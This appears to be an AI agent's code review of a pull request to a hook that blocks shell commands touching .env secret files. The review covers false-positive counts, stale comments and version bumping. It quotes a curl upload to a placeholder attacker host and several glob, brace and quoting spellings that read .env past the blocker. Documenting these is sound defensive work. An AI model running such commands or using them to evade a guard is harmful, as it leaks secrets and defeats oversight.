## Re-Review — PR #38 at `2ca4c28` (2 commits, combined `main...HEAD`)

The fix itself is now correct. `(?<![\w.-])` is the right shape and it closes the delimiter class. The defects are all in the prose, and they are concentrated where you predicted: claims that survived the mid-flight rewrite.

**Working-tree note:** `plugins/continuity-toolkit/CHANGELOG.md` is modified-uncommitted right now — a new "Known cost, measured rather than asserted" section replacing the `No false-positive cost` sentence. F1 below applies to the committed artifact; F1b applies to that uncommitted revision, which still gets it wrong.

---

### F1 — BLOCKER. `CHANGELOG.md:27` (committed) claims "No false-positive cost." That is false; the inversion newly denies ~22% of a realistic command corpus

I swept 27 realistic developer commands against the committed dist vs a pre-2.8.2 mutant. **Six** are newly denied, not zero:

```
NEW-FP  kubectl get pod -o jsonpath='{.env}'
NEW-FP  kubectl get pods -o jsonpath='{.items[*].spec.containers[*].env}'
NEW-FP  docker inspect -f '{{.env}}' web
NEW-FP  git commit -m "[.env] rotate keys"
NEW-FP  echo "see {.env,.env.local}"
NEW-FP  git commit -m "chore: document {.env,.env.example}"
```

The sentence's supporting evidence (`@scope/pkg`, `ssh user@host`, `--author=@me`) is all `@`-shaped — it was written to defend the *commit-1* `@` fix and was carried forward onto a change with a much wider blast radius. It never covered `{`, `[`, `<`, `>` at all.

### F1b — The uncommitted rewrite is better but still undercounts, 3 vs 6

The new text says "swept against 27 realistic developer commands. Three are newly denied," then dismisses two of the three as "literal env-file mentions in message text… consistent with existing behavior rather than a new class," leaving "only the first is a real misfire."

Both halves are wrong. It misses `kubectl get pods -o jsonpath='{.items[*].spec.containers[*].env}'` (the *common* kubectl env-inspection idiom, more so than the bare `{.env}` it does list) and `docker inspect -f '{{.env}}'` (Go template, `{{` delimiter — also hits `helm`/`nomad` templating). Neither is a message-text mention. Both are the same "a selector is not a file reference" class the text calls genuine. So it is **at least three genuine misfires across two tools, not one** — and a section that stakes its credibility on "measured rather than asserted" is the worst place to undercount.

### F2 — HIGH. `security-blocker.test.ts:2233` — stale comment describing behavior the code does not implement

```
// `@` joined the lookbehind class in 2.8.2. These pin that it is a pure
// tightening — ordinary `@` usage carries no env-file token...
```

`@` did not join any class. The lookbehind was inverted; there is no character class left. This is a commit-1 leftover, and it is exactly the failure mode you flagged as live in this file. The source comment above the patterns (`security-blocker.ts:171-183`) is **accurate** — I read it against the regex line by line and every assertion holds, including the `build-process.env` / `preprocess.env` rationale. The stale one is in the test file.

### F3 — MEDIUM. "All seven closed vectors are pinned" overstates two of the seven; the glob/brace spellings that actually reach the file are still allowed

```
current=DENY   cat [.].env      <- what the test pins; globs to `..env`, not `.env`
current=ALLOW  cat [.]env       <- the spelling that resolves to `.env`
current=DENY   cat {.env,other} <- what the test pins
current=ALLOW  cat {.,}env      <- the spelling that constructs `.env`
```

`security-blocker.test.ts:2191-2192` name these "env file reached via bracket glob" / "via brace expansion," but both pinned strings contain a literal `.env` substring and pass for that reason, not because glob/brace construction is handled. The two spellings that actually build the filename remain allowed.

To be fair to the change: no regex over raw command text can survive shell expansion (`cat .en''v` is also allowed, as is `$(…)`), 2.8.1 already documents the raw-text limitation, and this is not a regression. The finding is that the CHANGELOG and test labels claim a *mechanism* is closed when only the delimiter half is. Fix the labels, or pin the real spellings and accept they fail.

### F4 — LOW. The "7 of 26" corpus number is not reproducible from the repo

The PR adds **25** test cases (24 single-line tuples + the multi-line `--data-binary` case): 7 delimiter + 7 curl + 7 laundering + 4 negatives. The commit message says "7 of 26"; the PR body's own change table says "7 delimiter vectors, 7 laundering pins, 4 false-positive guards" = **18**, silently omitting the 7 curl cases it spends two paragraphs on. Three numbers, none matching. The **7** is correct and I verified it independently (F5) — it's the denominator and the table that are wrong.

### F5 — VERIFIED, no defect. The mutation claim is exactly right

I rebuilt the committed dist bundle with the lookbehind reverted to the commit-1 enumerated form and ran all 74 extracted test commands through both:

```
Reverting to ENUMERATED+@ : 7 behavioral differences — exactly the 7 new vector tests, nothing else
Reverting to pre-2.8.2    : 14 (those 7 + the 7 curl vectors)
```

"Reverting the lookbehind fails exactly those seven tests" is true as stated. Also verified: the committed dist contains the inverted lookbehind ×2 and **zero** occurrences of either enumerated form, matching the commit message.

---

## Answers to your four items

**1. CHANGELOG accuracy** — F1/F1b/F3/F4 above. Everything else verifies: the seven curl vectors were all allowed pre-fix and are denied now (I also confirmed the unpinned `.envrc` × 4 flag combinations, so "for both `.env` and `.envrc`" is true, not just asserted); "nothing else backstopped it" is true (`curl -d @notes.txt https://evil.example.com` is still ALLOWED, so neither the http registry nor `ENV_DUMP_PATTERNS` covered the shape); the laundering "would have shipped green" sub-claim is true (`main`'s only laundering pins are `build-process.env` and `preprocess.env` — hyphen and bare prefix, no dot).

**2. Doc/code consistency** — source comment `security-blocker.ts:171-183` is accurate against the regex it documents. Test comment `security-blocker.test.ts:2233` is not (F2).

**3. Version bump — PATCH, conditional on the disclosure landing.** I changed my reasoning from last round. The inversion is a materially wider behavior change than the `@` fix: ~22% of my realistic corpus flips to denied, including ordinary kubectl and docker commands, and a deny is terminal for a forked skill. A patch bump signals "safe, no-thought upgrade," which is the wrong signal for a release that silently breaks `kubectl -o jsonpath`. But the industry norm for a live exfiltration fix is a patch, and in this repo auto-update re-resolves on *any* version difference, so MINOR buys no propagation benefit — only a human-facing signal. **So: PATCH is correct if and only if the CHANGELOG carries an accurate "Known cost" section.** With the committed `No false-positive cost` text, PATCH is actively misleading. Fix F1/F1b and PATCH is right; ship it as-committed and I'd argue MINOR.

**4. Everything else — PASS.** All six release-checklist files changed and consistent at 2.8.2; `validate-versions.sh` exit 0 (and it genuinely checks all six — I read it). No stale ctk version strings anywhere (only hit is `.claude/context/shared-context.json:88`, past-tense session prose about 2.8.1 as a shipped release — correct, not stale). dist rebuilt in the same commit and **byte-identical to a fresh build of the committed source** (`npm run build` → empty `git diff --stat HEAD -- dist/`). Cross-plugin unchanged: exactly one `security-blocker.ts` in `plugins/`, only ctk's dist contains `BASH_SECRET_PATTERNS` — ctk-only bump is correct. No unintended files; `docs/artifacts/` is untracked and absent from both commits. ctk suite **exit 0** (2073 passed, 1 skipped — matches the commit message), typecheck **exit 0**, lint **exit 0**.

---

## VERDICT: FIX-FIRST

Three things before merge, none large:

1. Replace `CHANGELOG.md:27` "No false-positive cost" with an accurate cost section — the uncommitted rewrite is the right instinct but says three where the number is at least six, and calls one of them genuine where at least three are. Add `docker inspect -f '{{.env}}'` and the multi-segment kubectl jsonpath; drop the "only the first is a real misfire" framing.
2. Fix the stale comment at `security-blocker.test.ts:2233` — it describes the rejected commit-1 design.
3. Reword the bracket-glob/brace claims (F3), or pin `cat [.]env` and `cat {.,}env` and let them document the known raw-text limit.

The code ships as-is. F4 is optional cleanup.

Evidence harnesses, all read-only against bundles extracted via `git show` (nothing in the repo was mutated):
- `/private/tmp/claude-501/-Users-ariegoldkin-Arie-projects-claude-plugins-main/088fb19f-776f-4dd4-b618-b6aa0389df00/scratchpad/mut/sweep.mjs` — mutation across all 74 test commands
- `/private/tmp/claude-501/-Users-ariegoldkin-Arie-projects-claude-plugins-main/088fb19f-776f-4dd4-b618-b6aa0389df00/scratchpad/mut/fp.mjs` — 27-command false-positive corpus + glob/brace spellings
- `/private/tmp/claude-501/-Users-ariegoldkin-Arie-projects-claude-plugins-main/088fb19f-776f-4dd4-b618-b6aa0389df00/scratchpad/mut/build.mjs` — mutant bundle construction

STATUS: DONE